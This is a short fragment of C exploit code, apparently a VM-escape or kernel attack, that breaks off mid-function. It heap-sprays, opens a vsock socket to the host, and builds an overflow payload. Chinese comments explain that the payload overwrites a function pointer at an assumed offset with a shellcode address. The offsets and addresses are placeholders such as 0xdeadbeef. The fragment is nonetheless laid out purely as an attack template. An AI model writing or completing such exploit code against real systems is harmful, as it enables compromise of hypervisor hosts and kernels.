int main() {
    heap_spray();

    int sock = socket(AF_VSOCK, SOCK_DGRAM, 0);
    struct sockaddr_vm addr = {0};
    addr.svm_family = AF_VSOCK;
    addr.svm_cid = VMADDR_CID_HOST;
    addr.svm_port = 0x1234;

    // 构造溢出payload
    char payload[4096];
    memset(payload, 0, sizeof(payload));
    // 填充头部
    *(int*)payload = 0x1; // 消息类型
    // 溢出数据：覆盖到函数指针位置
    // 假设偏移为0x200处是函数指针
    *(unsigned long*)(payload + 0x200) = KERNEL_BASE + 0xdeadbeef; // shellcode地址
